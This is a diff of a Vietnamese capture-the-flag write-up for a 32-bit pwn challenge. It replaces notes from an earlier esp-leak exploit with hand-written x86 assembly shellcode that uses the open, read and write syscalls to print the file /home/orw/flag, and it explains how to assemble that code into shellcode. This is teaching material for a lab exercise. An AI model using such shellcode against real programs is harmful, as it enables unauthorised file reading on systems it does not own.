@@ -14,31 +14,46 @@ Only `open` `read` `write` syscall are allowed to use.
 
 Chương trình khá đơn giản, nó yêu cầu một chuỗi đầu vào và cuối hàm main thì gọi tới con trỏ có giá trị là địa chỉ của chuỗi mà ta nhập vào. 
 
-
+![execute.png](images/execute.png)
 
 # 2) Idea
 
-Thường những bài mà khi check secure flag `NX: NX disabled` và không có hàm giúp lấy shell hay đọc flag thì ý tưởng đầu tiên mình nghĩ tới là ghi shellcode vào chương trình sau đó điều khiển return address trỏ về shellcode. Ta sẽ giải quyết bài này theo ý tưởng đó nhưng có 2 vấn đề cần giải quyết:
-
-      1) Shellcode: Cái này thì ta có thể dễ dàng tìm thấy trên mạng hoặc tự viết cũng được miễn nó không quá dài vì input cho nhập tối đa 60 kí tự.
-      
-      2) Ta cần xác định được chính xác địa chỉ shellcode mà ta đã overwrite vào stack, để điều khiển return address trỏ về đúng vị trí shellcode.
+Ở phần hint của bài cũng đã mô tả khá rõ là ta chỉ có thể dùng shellcode `open`, `read` và `write`, khi chúng ta nhập input là shellcode thì cuối hàm main chương trình sẽ thực hiện các công việc mà shellcode đó yêu cầu. Ở đây ta sẽ dùng `syscall_open` để mở file flag ở `/home/orw/flag` và dùng `syscall_read`, `syscall_write` để đọc và ghi flag ra `terminal`, còn về shellcode 32bit thì ta phải tự viết vì đây không phải là shellcode execute nên không phổ biến để chọn.
 
 # 3) Exploit
 
-Để giải quyết vấn đề thứ hai, ta để ý đầu hàm `_start` là `push esp` đẩy giá trị esp vào stack rồi mới đến đẩy địa chỉ của hàm `_exit` lên stack. Khi đó bố cục của stack trước khi nhận input sẽ như sau. 
+Đầu tiên sẽ là shellcode `syscall_open` mở file flag ở `/home/orw/flag`. 
 
-![layoutStack1.png](images/layoutStack1.png)
+```asm
+	xor ecx,ecx                ; clear the ecx registry
+	mov eax, 0x5               ; sys_open
+	push ecx                   ; push a NULL value unto the stack
+	push 0x67616c66            ; galf (flag)
+	push 0x2f77726f            ; /wro (orw/)
+	push 0x2f656d6f            ; /emo (ome/)
+	push 0x682f2f2f            ; h/// (///h)
+	mov ebx, esp               ; move contents to ebx
+	xor edx, edx               ; clear the edx registry
+	int 0x80                   ; interrupt, call the kernel to execute the syscall
+```
 
-Nếu ta tạo payload điều khiển chương trình return về `0x08048087` - địa chỉ của câu lệnh `mov ecx,esp`, đưa địa chỉ của chuỗi cần in vào ecx để thực hiện `syscall write()` và sau khi return về chương trình sẽ thực hiện `syscall write()` lần thứ hai, in ra 20 bytes trên stack. Vì 4 bytes đầu tiên trên stack lúc này chính là esp nên ta sẽ leak được địa chỉ esp. Chương trình sẽ tiếp tục với một lệnh `syscall read()` thứ hai, ta sẽ gửi payload thứ hai bao gồm "A"*0x14 + (giá trị leak được chính là nơi ta ghi shellcode = esp+20) + shellcode, lúc này chương trình sẽ return về đúng shellcode mà ta cần.
+Tiếp theo là `syscall_read` và `syscall_write` để đọc và ghi flag.
 
-![layoutStack2.png](images/layoutStack2.png)
+```asm
+	mov eax, 0x3               ; sys_read
+	mov ecx, ebx               ; contents of the flag file
+	mov ebx, 0x3               ; fd
+	mov dl, 0x30               ; decimal 48, used for the interrupt
+	int 0x80                   ; interrupt, call the kernel to execute the syscall
 
-Layout stack sau khi ta ghi đè return address bằng địa chỉ câu lệnh `mov ecx,esp` và chương trình return về địa chỉ đó. Khi thực hiện lệnh `ret` - địa chỉ hàm `_exit` bị đẩy ra khỏi stack và esp tăng lên 4 chỉ vào nơi mà ở đó lưu giá trị của esp (Ô nhớ lưu giá trị là địa chỉ của chính ô nhớ đó). Vì vậy ta sẽ in ra được giá trị chính là địa chỉ của ô nhớ trên stack - là nơi ta lưu shellcode vì dễ dàng return về đúng shellcode do biết được chính xác địa chỉ.
+	mov eax, 0x4               ; sys_write
+	mov bl, 0x1                ; decimal 1, used for the interrupt
+	int 0x80                   ; interrupt, call the kernel to execute the syscall
+```
 
-![layoutStack2.png](images/layoutStack2.png)
+Trên đây là code asm không phải là shellcode, bạn có thể dùng các hàm có sẵn trong `pwntools` để chuyển code trên thành mã shellcode. Tôi dùng tools online [defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly2) để làm điều đó.
 
-Lần nhập thứ hai ta ghi đè địa chỉ trả về là địa chỉ leak được sau đó chính là shellcode, gửi payload thứ hai: payload = "A"*0x14 + (esp+20) + shellcode, lúc này chương trình sẽ return về đúng shellcode mà ta cần.
+![shellcode.png](images/shellcode.png)
 
 # 4) Source code and get Flag
 
